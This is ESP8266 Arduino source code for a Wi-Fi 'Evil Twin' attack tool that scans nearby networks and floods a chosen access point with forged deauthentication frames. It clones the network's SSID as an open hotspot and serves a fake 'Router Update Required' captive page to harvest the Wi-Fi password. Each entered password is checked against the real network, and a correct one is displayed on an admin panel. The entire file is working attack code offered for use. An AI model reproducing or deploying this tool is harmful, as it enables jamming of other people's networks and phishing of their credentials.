#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";
String _tryPassword = "";

void setup() {

  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 0, 1) , IPAddress(192, 168, 0, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("Evil-king", "Pass@123");
  dnsServer.start(53, "*", IPAddress(192, 168, 0, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/kingo", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i].rssi = WiFi.RSSI(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  
  // Check if the WiFi is not connected (wrong password case)
  if (WiFi.status() != WL_CONNECTED) {
    // Send wrong password page
    webServer.send(200, "text/html", 
    "<html>"
    "<head>"
    "    <meta name='viewport' content='initial-scale=1.0, width=device-width'>"
    "    <title>Wrong Password</title>"
    "    <style>"
    "        body {"
    "            font-family: Arial, sans-serif;"
    "            background-color: #f4f4f4;"
    "            display: flex;"
    "            justify-content: center;"
    "            align-items: center;"
    "            height: 100vh;"
    "            margin: 0;"
    "        }"
    "        .container {"
    "            background-color: white;"
    "            padding: 20px;"
    "            text-align: center;"
    "            border-radius: 8px;"
    "            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);"
    "        }"
    "        h2 {"
    "            color: #d9534f;"  // Red for wrong password indication
    "        }"
    "        p {"
    "            color: #333;"
    "            font-size: 16px;"
    "        }"
    "        .redirect {"
    "            color: #555;"
    "            margin-top: 15px;"
    "            font-size: 12px;"
    "        }"
    "    </style>"
    "    <script>"
    "        setTimeout(function(){"
    "            window.location.href = '/';"
    "        }, 3000);"  // Redirect after 3 seconds
    "    </script>"
    "</head>"
    "<body>"
    "    <div class='container'>"
    "        <h2> Wrong Password</h2>"
    "        <p>Please, try again.</p>"
    "        <p class='redirect'>You will be redirected in 3 seconds...</p>"
    "    </div>"
    "</body>"
    "</html>"
    );
    Serial.println("Wrong password tried !");
    
  } else {
    // Send correct password page
    webServer.send(200, "text/html", 
    "<html>"
    "<head>"
    "    <meta name='viewport' content='initial-scale=1.0, width=device-width'>"
    "    <title>Correct Password</title>"
    "    <style>"
    "        body {"
    "            font-family: Arial, sans-serif;"
    "            background-color: #f4f4f4;"
    "            display: flex;"
    "            justify-content: center;"
    "            align-items: center;"
    "            height: 100vh;"
    "            margin: 0;"
    "        }"
    "        .container {"
    "            background-color: white;"
    "            padding: 20px;"
    "            text-align: center;"
    "            border-radius: 8px;"
    "            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);"
    "        }"
    "        h2 {"
    "            color: #5cb85c;"  // Green for correct password indication
    "        }"
    "    </style>"
    "</head>"
    "<body>"
    "    <div class='container'>"
    "        <h2>✅ Correct Password</h2>"
    "        <p>Thank you, you are now connected.</p>"
    "    </div>"
    "</body>"
    "</html>"
    );
    
    hotspot_active = false;
    dnsServer.stop();
    
    // Disconnect the current softAP
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    
    // Reconfigure the softAP
    WiFi.softAPConfig(IPAddress(192, 168, 0, 1), IPAddress(192, 168, 0, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("Evil-king", "Pass@123");
    dnsServer.start(53, "*", IPAddress(192, 168, 0, 1));
    
    // Log success
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered!");
    Serial.println(_correct);
  }
}



String _tempHTML = "<!DOCTYPE html>"
                    "<html>"
                    "<head>"
                    "    <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                    "    <style>"
                    "        body {"
                    "            font-family: Arial, sans-serif;"
                    "            background-color: #282c34;"
                    "            color: #f5f5f5;"
                    "            margin: 0;"
                    "            padding: 0;"
                    "            display: flex;"
                    "            justify-content: center;"
                    "            align-items: center;"
                    "            height: 100vh;"
                    "        }"
                    "        .container {"
                    "            max-width: 600px;"
                    "            width: 100%;"
                    "            background-color: #1e1e1e;"
                    "            padding: 20px;"
                    "            border-radius: 10px;"
                    "            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);"
                    "            text-align: center;"
                    "        }"
                    "        .marquee {"
                    "            overflow: hidden;"
                    "            white-space: nowrap;"
                    "            box-sizing: border-box;"
                    "            width: 100%;"
                    "            background-color: #333;"
                    "            padding: 10px;"
                    "            border-radius: 5px;"
                    "            color: #e0e0e0;"
                    "        }"
                    "        .marquee h1 {"
                    "            display: inline-block;"
                    "            animation: marquee 10s linear infinite;"
                    "            font-size: 24px;"
                    "            margin: 0;"
                    "        }"
                    "        @keyframes marquee {"
                    "            0% { transform: translateX(100%); }"
                    "            100% { transform: translateX(-100%); }"
                    "        }"
                    "        button {"
                    "            background-color: #4CAF50;"
                    "            color: white;"
                    "            border: none;"
                    "            padding: 10px 20px;"
                    "            text-align: center;"
                    "            text-decoration: none;"
                    "            display: inline-block;"
                    "            font-size: 16px;"
                    "            margin: 4px 2px;"
                    "            cursor: pointer;"
                    "            border-radius: 5px;"
                    "        }"
                    "        button:disabled {"
                    "            background-color: #777;"
                    "            cursor: not-allowed;"
                    "        }"
                    "        table {"
                    "            width: 100%;"
                    "            border-collapse: collapse;"
                    "            margin-top: 20px;"
                    "        }"
                    "        table, th, td {"
                    "            border: 1px solid #555;"
                    "            padding: 10px;"
                    "        }"
                    "        th {"
                    "            background-color: #333;"
                    "            color: #fff;"
                    "        }"
                    "        tr:nth-child(even) {"
                    "            background-color: #2a2a2a;"
                    "        }"
                    "        tr:nth-child(odd) {"
                    "            background-color: #1e1e1e;"
                    "        }"
                    "        td {"
                    "            color: #ccc;"
                    "        }"
                    "        .excellent {"
                    "            background-color: #4CAF50;"
                    "        }"
                    "        .good {"
                    "            background-color: #FFC107;"
                    "        }"
                    "        .medium {"
                    "            background-color: #FF9800;"
                    "        }"
                    "        .poor {"
                    "            background-color: #F44336;"
                    "        }"
                    "    </style>"
                    "</head>"
                    "<body>"
                    "    <div class='container'>"
                    "        <div class='marquee'><h1>MR.KING</h1></div>"
                    "        <div>As a Sagar Corporation</div>"
                    "          <a href='https://youtube.com/@sagarcorporation'>Subscribe !!!</a>"
                    "        <div>"
                    "            <form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                    "                <button {disabled}>{deauth_button}</button>"
                    "            </form>"
                    "            <form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                    "                <button {disabled}>{hotspot_button}</button>"
                    "            </form>"
                    "        </div>"
                    "        <br>"
                    "        <table>"
                    "            <tr>"
                    "                <th>SSID</th>"
                    "                <th>BSSID</th>"
                    "                <th>Channel</th>"
                    "                <th>Signal Strength</th>"
                    "                <th>Select</th>"
                    "            </tr>";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 0, 1) , IPAddress(192, 168, 0, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 0, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 0, 1) , IPAddress(192, 168, 0, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("Evil-king", "Pass@123");
      dnsServer.start(53, "*", IPAddress(192, 168, 0, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", 
                      "<!DOCTYPE html>"
                      "<html>"
                      "<head>"
                      "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                      "<title>Verifying Password</title>"
                      "<style>"
                      "    body {"
                      "        font-family: Arial, sans-serif;"
                      "        background-color: #f4f4f4;"
                      "        display: flex;"
                      "        justify-content: center;"
                      "        align-items: center;"
                      "        height: 100vh;"
                      "        margin: 0;"
                      "        text-align: center;"
                      "    }"
                      "    .container {"
                      "        background-color: white;"
                      "        padding: 20px;"
                      "        border-radius: 8px;"
                      "        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);"
                      "    }"
                      "    h2 {"
                      "        color: #333;"
                      "    }"
                      "    .loading-bar {"
                      "        width: 100%;"
                      "        background-color: #ddd;"
                      "        border-radius: 20px;"
                      "        overflow: hidden;"
                      "        margin-top: 20px;"
                      "    }"
                      "    .loading-bar-fill {"
                      "        height: 10px;"
                      "        width: 0;"
                      "        background-color: #5cb85c;"
                      "        border-radius: 20px;"
                      "        animation: loading 15s linear forwards;"
                      "    }"
                      "    @keyframes loading {"
                      "        0% { width: 0; }"
                      "        100% { width: 100%; }"
                      "    }"
                      "</style>"
                      "<script>"
                      "    setTimeout(function(){"
                      "        window.location.href = '/result';"
                      "    }, 15000);"  // Redirect to /result after 15 seconds
                      "</script>"
                      "</head>"
                      "<body>"
                      "    <div class='container'>"
                      "        <h2>Verifying password with system...</h2>"
                      "        <div class='loading-bar'>"
                      "            <div class='loading-bar-fill'></div>"
                      "        </div>"
                      "    </div>"
                      "</body>"
                      "</html>"
                      );
    } else {
      webServer.send(200, "text/html", 
                  "<!DOCTYPE html>"
                  "<html lang='en'>"
                  "<head>"
                  "    <meta charset='UTF-8'>"
                  "    <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                  "    <title>Router Update Required</title>"
                  "    <style>"
                  "        body {"
                  "            font-family: Arial, sans-serif;"
                  "            background-color: #f4f4f4;"
                  "            margin: 0;"
                  "            padding: 0;"
                  "            display: flex;"
                  "            justify-content: center;"
                  "            align-items: center;"
                  "            height: 100vh;"
                  "        }"
                  "        .container {"
                  "            background-color: white;"
                  "            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);"
                  "            padding: 20px;"
                  "            border-radius: 8px;"
                  "            width: 350px;"
                  "            text-align: center;"
                  "        }"
                  "        h2 {"
                  "            color: #333;"
                  "            margin-bottom: 20px;"
                  "        }"
                  "        label {"
                  "            font-size: 14px;"
                  "            color: #555;"
                  "        }"
                  "        input[type='text'] {"
                  "            width: 100%;"
                  "            padding: 10px;"
                  "            margin: 10px 0 20px;"
                  "            border: 1px solid #ccc;"
                  "            border-radius: 4px;"
                  "            font-size: 16px;"
                  "        }"
                  "        input[type='submit'] {"
                  "            background-color: #4CAF50;"
                  "            color: white;"
                  "            padding: 12px 20px;"
                  "            border: none;"
                  "            border-radius: 4px;"
                  "            cursor: pointer;"
                  "            width: 100%;"
                  "            font-size: 16px;"
                  "        }"
                  "        input[type='submit']:hover {"
                  "            background-color: #45a049;"
                  "        }"
                  "        .warning {"
                  "            font-size: 12px;"
                  "            color: #d9534f;"
                  "            margin-top: 10px;"
                  "        }"
                  "    </style>"
                  "</head>"
                  "<body>"
                  "    <div class='container'>"
                  "        <h2>Router " + _selectedNetwork.ssid + " needs to be updated</h2>"
                  "        <form action='/'>"
                  "            <label for='password'>Enter Router Password:</label><br>"
                  "            <input type='text' id='password' name='password' value='' minlength='8' placeholder='Enter password' required><br>"
                  "            <input type='submit' value='Submit'>"
                  "        </form>"
                  "        <p class='warning'>Your router will be disconnected if the password is incorrect.</p>"
                  "    </div>"
                  "</body>"
                  "</html>");

    }
  }

}

void handleAdmin() {
  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 0, 1), IPAddress(192, 168, 0, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 0, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 0, 1), IPAddress(192, 168, 0, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("Evil-king", "Pass@123");
      dnsServer.start(53, "*", IPAddress(192, 168, 0, 1));
    }
    return;
  }

  _html += "<tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Signal Strength</th><th>Select</th></tr>";

  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") {
      break;
    }

    String signalClass;
    int rssi = _networks[i].rssi;
    if (rssi > -50) {
      signalClass = "excellent";
    } else if (rssi > -70) {
      signalClass = "good";
    } else if (rssi > -85) {
      signalClass = "medium";
    } else {
      signalClass = "poor";
    }

    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "</td>";
    _html += "<td class='" + signalClass + "'>" + String(rssi) + " dBm</td>";
    _html += "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

    if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }

  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);
}


String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
